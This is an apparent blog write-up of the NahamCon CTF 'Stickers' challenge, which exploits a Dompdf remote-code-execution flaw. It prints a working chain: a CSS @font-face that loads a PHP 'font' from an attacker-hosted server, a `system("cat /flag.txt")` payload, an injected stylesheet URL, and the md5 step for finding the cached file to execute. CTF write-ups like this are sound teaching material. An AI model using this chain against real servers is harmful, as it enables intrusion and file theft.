XSS 𝔽𝕠𝕟𝕥𝕔𝕖𝕡𝕥𝕚𝕠𝕟

Hello everyone! At the time of release, NahamCon has wrapped up their annual CTF event which I found to be extremely enjoyable and thought-provoking. I found one particular challenge to be very interesting and wanted to showcase the solution to their challenge Stickers.

![](https://miro.medium.com/v2/resize:fit:764/1*fTlKSMltVkq3gYDan3SEsA.png)

The challenge first takes you to a web application that accepts user-supplied input in various forms. Before any testing, I submitted some arbitrary information to see how the application processed this.

![](https://miro.medium.com/v2/resize:fit:764/1*4PncvDKs-U8oJW7UNNdEDg.png)

Upon submission, the input is converted from HTML to PDF.

![](https://miro.medium.com/v2/resize:fit:709/1*8j625j4Wy1R1T4xMROcQWQ.png)

My initial presumption was that this challenge was going to involve either [SSRF](https://portswigger.net/web-security/ssrf) or injecting some PDF code to perform XSS. I read through some great articles on the subject, most particularly, [_Portable Data exFiltration: XSS for PDFs_](https://portswigger.net/research/portable-data-exfiltration)_,_ however, with the flag.txt file residing outside the environment of the PDF, it did not seem of much fruition.

Continuing my testing, analyzing the HTTP response in Burpsuite highlighted something of interest.

![](https://miro.medium.com/v2/resize:fit:392/1*Ooyez2rIai0elmPo0jMwxA.png)

DOMPDF is a PHP library that can be used to easily create PDFs from various HTML pages in PHP. At its core, it allows for the generation of PDF documents from HTML content using the CSS and layout capabilities of the web.

After doing some quick research on the specific version number, it appears to be [vulnerable](https://www.cvedetails.com/vulnerability-list/vendor_id-21291/product_id-64244/version_id-528074/Dompdf-Project-Dompdf--.html) to Remote Code Execution. Because the form fields will accept HTML tags, we can also try and submit a reference to CSS or a CSS file. This vulnerability exists due to the improper input validation of the ‘src’ field of a CSS statement, ultimately allowing PHP code to be embedded within the referenced file. The validation also only ensures the file type is supported, but pays no attention to the contents of the file. Not only does this external style sheet get rendered by the DOMPDF library, but it also is saved in the local cache and then referenced by the DOMPDF framework.

I decided to create a CSS file that will load our external style sheet and render the font file with our embedded PHP.
```CSS
@font-face {  
  font-family:'test';  
  src:url('http://<DOMAIN>:1337/test.php');  
  font-weight:'normal';  
  font-style:'normal';  
}
```


Then I created a test.php file using the exploit font file [here](https://github.com/snyk-labs/php-goof/tree/main/exploits) and changed the PHP payload to the following:

(RAW CONTENT AVAILABLE AT LINK)  
```php
<?php system("cat /flag.txt"); ?>
```

I hosted these files through a python web server and then used a <link rel>
attribute in the _organisation_ parameter to reference the malicious .css and .php. Keep in mind the naming convention of the font file must be the same as the _font-family_ attribute.

```
http://challenege.nahamcon:31583/quote.php?organisation=%3Clink+rel%3Dstylesheet+href%3D%27http%3A%2F%2F<IP>:<ListeningPort>/test.css%27%3E&email=email%40email.com&small=1&medium=2&large=4
```

To execute our embedded PHP, we need to reference the file name of the cached font. This [article](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf) by Optiv details the fairly simple naming convention of these cached fonts.

```
filename = fontname+_+style+_+md5 hash+.+file extension
```

While this may sound overly complex, the solution is quite simple. We can easily calculate the MD5 hash by running the command:

```bash
echo -n "http://<IP>:<PORT>/test.php" |md5sum
```

Using this output we can navigate to where our cached font file resides by supplying the file path /dompdf/lib/fonts/test_normal_<md5hash>.php in the URL. Upon navigating to the link our embedded PHP code is executed returning the contents of the flag.txt file.

![](https://miro.medium.com/v2/resize:fit:764/1*Cs5nhwywcFtOLxcsK4uPSg.png)

If you’ve made it this far, I hope you may have learned something new. I sure did and found this challenge to be fairly difficult, but quite rewarding. Thanks for STICKERing around…

**Resources/Links:**

https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/)(https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/
https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf)(https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf  
https://github.com/positive-security/dompdf-rce/](https://github.com/positive-security/dompdf-rce/
